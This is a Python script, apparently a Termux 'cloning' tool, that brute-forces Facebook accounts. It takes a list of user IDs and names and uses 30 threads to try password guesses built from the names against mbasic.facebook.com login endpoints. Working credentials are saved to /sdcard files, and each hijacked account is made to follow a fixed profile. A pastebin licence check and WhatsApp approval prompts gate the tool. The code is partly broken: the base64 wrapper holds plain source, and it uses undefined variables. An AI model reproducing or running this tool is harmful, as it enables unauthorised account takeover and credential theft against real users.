import base64
exec(base64.b64decode("#!/usr/bin/python3
#-*-coding:utf-8-*-
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:

    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:

    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        
def main_apv():
    imt="BOSS=="
    ak="RAFI-7100"
    os.system('clear')
    print(logo)
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.khan-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print (" [$]••••••••••••••••••••••••••••••••[$] ")
        print ("\033[1;36m [ Tool Paid Ha Please Free wala Koi Na Aye ]") 
        print ("\033[1;32m [$]••••••••••••••••••••••••••••••••[$] ")
        print ("\033[1;33m [ This Tool Is Paid Dont Come Free People ]")
        print ("\033[1;32m [$]••••••••••••••••••••••••••••••••[$] ")
        print ("  Your Token Is Not Approved Already")
        print (" [$]••••••••••••••••••••••••••••••••[$] ")
        print ("           THIS IS YOUR KEY")
        print (" [$]••••••••••••••••••••••••••••••••[$] ")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print (" [$]••••••••••••••••••••••••••••••••[$] ")
        kok=open('/data/data/com.termux/files/usr/bin/.khan-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print (" [$]••••••••••••••••••••••••••••••••[$] ")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
        os.system('am start https://wa.me/+014016017898?text=' + tks)
        
    r1=requests.get("https://pastebin.com/raw/6LbSwsXN").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
        print(logo)
        print("\033[1;93m\t[\x1b[1;97m\x1b[1;41m WELOME TO THE CYBER WORLD PAID TOOL \x1b[0m\x1b[1;93m]") 
        print ("  \033[1;91m     Ops You Don't Have Subscription Yet\033[1;91m! ")
        print('\x1b[1;91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
        print ("\033[1;36m\033[1;93m[\033[1;91m<\033[1;92m>\033[1;93m] \033[1;92mYOUR TOKEN :\033[1;93m "+ak+key1)
        print('\x1b[1;91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;97m')
        time.sleep(3.5)
        tks = 'Dear%20Developer%20Younis,%20Please%20Apporve%20My%20Token%20To%20Premium%20my%20Token%20Is%20%20:%20'+ak+''+key1
        os.system('am start https://wa.me/+01401607898?text=' + tks)
        
logo = """\033[1;92m
 #     # ######      ######     #    #######   
 ##   ## #     #     #     #   # #   #       # 
 # # # # #     #     #     #  #   #  #       # 
 #  #  # ######      ######  #     # #####   # 
 #     # #   #   ### #   #   ####### #       # 
 #     # #    #  ### #    #  #     # #       # 
 #     # #     # ### #     # #     # #       # 
                                               

\033[1;90m════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ANMAUL SHAKE 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : GROUP NAHI HE
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : MRCYBERKING7
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mVERSION  : 0.0.3
\033[1;90m════════════════════════════════════════════════
    """
def hasil(OK,cp):
	if not len(OK) != 0:	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/CYBER-OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/CYBER-CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Ahmad Menu ")
	    R()

		

def R():
			os.system("clear")
			print(logo)
			print("       \033[1;93m\t [\x1b[1;97m\x1b[1;41m SUBSCRIPTION SUCCESSFULL \x1b[0m\x1b[1;93m]")
			print ('\033[1;97m╭───────────────────────────────────────────╮')
			print (" \x1b[1;97m[\033[\033[1;91m•\033[1;97m] \033[1;97mStatus : \033[1;92mPremium :)")
			print  (" \x1b[1;97m[\033[\033[1;91m•\033[1;97m] \033[1;93mLimit  : \033[1;92mMonthly\033[1;97m")
			print ('\033[1;97m╰───────────────────────────────────────────╯')
			print("\033[1;37m [\033[1;92m1\033[1;97m] \033[1;92mFile Cloning  ")
			print("\033[1;37m [\033[1;92m3\033[1;97m] Contact Developer")
			print("\033[1;37m [\033[1;92m4\033[1;97m] Facebook  \033[1;91m (Anamul Shake)")
			print ("\033[1;37m [\033[1;91m0\033[1;97m] \033[1;91mExit")
			print ('\033[1;97m╭───────────────────────────────────────────╮')
			key = input(" \x1b[1;97m[\033[\033[1;91m•\033[1;97m]\033[1;32m Choose : ")
			print ('\033[1;97m╰───────────────────────────────────────────╯')
			if key in [""]:
				print (" [!] Please Select Correct Option")
				exit()
			elif key in ["1", "01"]:
				__xxx__().imtiaz(id)
			elif key in ["2", "02"]:

				os.system('python Dump.py')
			elif key in ["3", "03"]:
				
				dupcutter()
			elif key in ["4", "04"]:
				
				os.system("xdg-open https://www.facebook.com/rafivaim.m.m")
				R()
			elif key in ["5", "05"]:
				time.sleep(0.5)
				yt()
				R()
				login()
			elif key in ["0", "00" , "6"]:
				time.sleep(0.5)
				exit("\n \x1b[1;97m[\033[\033[1;92m✓\033[1;97m] Thank You 🙂\n")


class __xxx__:
    def __init__(self):
        self.id = []
    def imtiaz(self,ak):
        if 1 in fuck:
            os.system('#')

        

      

        

        self.cnt = input(' \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write("\r \x1b[1;37m[\033[1;92mMR\033[1;97m]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[OK][{len(ok)}]\033[1;37m | \033[1;31m[CP][0]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                     }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [CYBER  OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/CYBER-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        wrt = '%s|%s' % (use,w)
                        cp.append(wrt)
                        open('/sdcard/CYBER-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    wrt = '%s|%s' % (usr,w)
                    cp.append(wrt)
                    open('/sdcard/RAFI-CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
            
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
    def __pler__(self):
        print("\033[1;93m╭───────────────────────────────────────────╮") 
        print(' \033[1;97m[\033[1;92m1\033[1;97m] \033[1;92mCrack With Auto Pass ')
        print('\033[1;97m [\033[1;92m2\033[1;97m] \033[1;92mCrack With Name Digit Pass')
        print("\033[1;93m╰───────────────────────────────────────────╯") 
        chi = input('\n \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Choose: ')
        if chi == '':
            print('\n   Select Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("  \033[1;32m\x1b[1;97m[\033[\033[1;91m•\033[1;97m] \033[1;93mTurn On Flight Mode After 10m For 5Sec")
            print("\033[1;97m╭─────────────────────────────────────────────╮") 
            print("\033[1;97m  [\033[1;92m√\033[1;97m]\033[1;92m OK \033[1;97mResult Save to : \033[1;92mCYBER-OK.txt")
            print("\033[1;97m╰─────────────────────────────────────────────╯")

            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]      
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("")
            print("\033[1;37m\r   Enter Last Name Digits\033[1;37m\n")
            print ("\033[1;37m\r  \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Exmple : 123 + 12345 + 1234 + 1122\033[1;37m\n")
            p1 = input('  \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Name + 1 : ')
            p2 = input('  \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Name + 2 : ')
            p3 = input('  \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Name + 3 : ')
            p4 = input('  \x1b[1;97m[\033[\033[1;91m•\033[1;97m] Name + 4 : ')
            os.system("clear")
            print(logo)
            print("  \033[1;32m\x1b[1;97m[\033[\033[1;91m•\033[1;97m] \033[1;93mTurn On Flight Mode After 10m For 5Sec")
            print("\033[1;97m╭─────────────────────────────────────────────╮") 
            print("\033[1;97m  [\033[1;92m√\033[1;97m]\033[1;92m OK \033[1;97mResult Save to : \033[1;92mCYBER-OK.txt")
            print("\033[1;97m╰─────────────────────────────────────────────╯")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1],xz[0]+"1122"]
                        else:
                            pwx = [name, xz[0]+xz[1],xz[0]+"1122"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
             

def dupcutter():
	os.system("xdg-open https://wa.me/+01401607898")
	time.sleep(3)
	R()
def yt():
	logo()
	os.system("xdg-open https://www.facebook.com/rafivaim.m.m")
	time.sleep(3)
	R()

    

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r \033[1;93mWait Bro Loading ...')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

main_apv()"))